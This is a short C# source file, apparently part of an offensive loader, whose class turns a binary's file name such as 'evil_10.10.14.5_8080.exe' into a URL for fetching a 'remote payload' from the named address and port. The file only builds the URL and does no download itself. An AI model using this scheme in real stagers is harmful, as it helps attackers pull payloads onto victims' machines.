using System;

/*
 * Class to extract remote payload URL from pe/lib filename.
 */
namespace SayMyName
{
    public class ParseRemote
    {
        /*
         * proceed:
         * [>] filename: evil_10.10.14.5_8080.exe
         * [>] words count: 3
         * [>] word: esmb
         * [>] word: 10.10.14.5
         * [>] word: 8080.exe
         */
        public static string GetUrl(string binName)
        {
            string ipAddr = "0.0.0.0";
            string ipPort = "80";

            if (binName.Contains("_"))
            {
                string[] words = binName.Split('_');

                /*Console.WriteLine("[>] words count: " + words.Length);
                foreach (var word in words)
                {
                    System.Console.WriteLine("[>] word: " + word);
                }*/

                if (words.Length == 3)
                {
                    ipAddr = words[1];
                    ipPort = words[2].Split('.')[0];
                }
            }
            else
            {
                Console.WriteLine("[!] Unknown remote");
            }


            return BuildUrl(ipAddr, ipPort);
        }
        public static string BuildUrl(string addr, string port)
        {
            string uri = "";
            string proto = "";

            if (port.Contains("443"))
            {
                proto = "https";
            }
            else
            {
                proto = "http";
            }

            uri = proto + "://" + addr + ":" + port;

            return uri;
        }
    }
}
